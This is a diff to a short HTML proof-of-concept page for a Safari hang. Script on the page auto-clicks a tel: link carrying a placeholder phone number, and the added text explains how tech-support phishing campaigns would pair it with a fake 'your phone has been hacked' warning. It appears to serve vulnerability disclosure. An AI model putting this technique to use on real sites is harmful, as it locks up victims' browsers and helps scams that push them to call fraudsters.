@@ -14,7 +14,7 @@
 <h1>Safari Hang POC</h1>
 
 <p>
-You should recieve a request to call a phone number. After clicking cancel, Safari will be completely unresponsive.
+You should recieve a request to call a phone number. After clicking cancel, Safari will be completely unresponsive. A phishing campaign would normally put a warning here telling you that your phone has been hacked and you must call the number to resolve the issue.
 </p>
 
 <!-- This is the target element -->
@@ -23,7 +23,7 @@ You should recieve a request to call a phone number. After clicking cancel, Safa
 <!-- This initially sets up the phish -->
 <script type="text/javascript">
 
-jQuery('#result').append('<a href="tel:Safari Hang POC"></a>');
+jQuery('#result').append('<a href="tel:Safari Hang POC +1-800-555-5555"></a>');
 document.querySelector('a').click();
 
 </script>
